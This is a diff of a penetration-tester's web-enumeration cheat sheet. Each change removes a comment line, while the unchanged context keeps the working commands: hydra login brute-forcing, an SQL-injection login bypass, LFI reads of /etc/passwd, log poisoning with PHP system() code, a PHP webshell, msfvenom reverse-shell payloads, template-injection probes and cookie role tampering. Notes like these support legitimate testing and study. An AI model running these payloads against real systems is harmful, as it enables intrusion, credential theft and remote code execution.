@@ -379,7 +379,6 @@ wpscan --url http://TARGET --enumerate u,vp,vt,cb --plugins-detection aggressive
 
 ### Login Page Found
 ```bash
-# loot/next_steps.txt contains a hydra http-post-form template for detected login forms
 # Adjust the form body and failure string, then run:
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
       -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
@@ -443,7 +442,6 @@ curl -s http://TARGET/swagger.json | python3 -m json.tool
 
 ### .git Exposed
 ```bash
-# loot/next_steps.txt emits this only if /.git/HEAD or /.git/config was found
 # Dump the entire repository:
 git-dumper http://TARGET/.git/ ./git-dump
 cd git-dump && git log --oneline
@@ -544,7 +542,6 @@ gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.
 gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt      # Apache
 gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt      # Spring
 
-# Case-sensitive variations (IIS is case-insensitive, Linux is not)
 # If Linux target: try lowercase, uppercase, capitalized
 gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
 
@@ -569,16 +566,9 @@ The script doesn't brute-force web login forms. If you have a login page:
 # Identify the form fields first (use curl or browser DevTools)
 curl -sk http://IP/login -v 2>&1 | grep -iE 'input|form|action'
 
-# Hydra HTTP POST form brute force
 # Syntax: "POST_PATH:POST_BODY:FAIL_STRING"
 hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
   "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10
-
-# Common default credentials to try manually first (faster than brute force)
-# admin:admin, admin:password, admin:admin123, admin:(blank)
-# administrator:administrator, root:root, user:user
-# App-specific: tomcat:tomcat, manager:manager, pi:raspberry
-# Check the app version → searchsploit for default creds
 
 # SQLi in login field — try manually first
 admin'--
@@ -616,7 +606,6 @@ curl -sk "http://IP/page.php?file=/etc/passwd%00"                 # null byte (o
 curl -sk "http://IP/page.aspx?file=../../../../windows/win.ini"
 curl -sk "http://IP/page.aspx?file=C:\windows\win.ini"
 
-# LFI to RCE via log poisoning (Apache)
 # 1. Poison the access log with PHP code in User-Agent
 curl -sk http://IP/ -A "<?php system(\$_GET['cmd']); ?>"
 # 2. Include the log and execute
@@ -647,14 +636,6 @@ C:\Windows\System32\drivers\etc\hosts
 ### File Upload — When You Find an Upload Form
 
 ```bash
-# Test what's accepted — try in this order:
-# 1. Direct .php upload
-# 2. .php5, .phtml, .phar, .php3 (bypasses extension blacklists)
-# 3. Rename: shell.php.jpg (double extension)
-# 4. Case variation: shell.PhP, shell.PHP
-# 5. Content-Type bypass: change Content-Type to image/jpeg while keeping .php extension
-# 6. Magic bytes: prepend GIF89a; to the PHP payload
-
 # Basic PHP webshell
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
@@ -679,7 +660,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f aspx > shell.
 If the app reflects your input back (name fields, search boxes, custom messages):
 
 ```bash
-# Probe — inject template expressions and see if they evaluate
 # In the vulnerable field, try each:
 {{7*7}}          # if you see 49, it's Jinja2/Twig
 ${7*7}           # FreeMarker, Velocity
@@ -731,14 +711,8 @@ curl -sk http://IP/manage/
 curl -sk http://IP/..;/admin/
 curl -sk http://IP/%2e%2e/admin/
 
-# Cookie manipulation — if you see a role=user or admin=false cookie
 # Change it in Burp or via curl:
 curl -sk http://IP/admin -H "Cookie: role=admin; session=your_session_token"
-
-# JWT tampering — if you see a JWT token (three base64 parts separated by dots)
-# Decode: echo "PAYLOAD_PART" | base64 -d
-# Try: change "role":"user" to "role":"admin", then re-sign with empty secret
-# Tool: jwt_tool eyJhbGciOiJIUzI1NiJ9... -T      # interactive tamper
 
 # IDOR — change numeric IDs in URLs
 curl -sk http://IP/api/user/1        # your profile
@@ -814,6 +788,5 @@ curl -sk "http://IP/index.php."      # trailing dot (IIS)
 - [[Web_App]] — web attack vectors after enumeration
 - [[SQL_Injection]] — if webenum finds login/search forms
 - [[Burp_Suite]] — manual testing after webenum finds endpoints
-- [[Engagement_Methodology]] — where web enum fits in the attack chain (Phase 5)
 - [[Toolkit_Strategy]] — engagement run order; `livefetch --stage web` for re-fetch + delta
 - [[Reverse_Shells]] — use Penelope with -O flag after exploitation
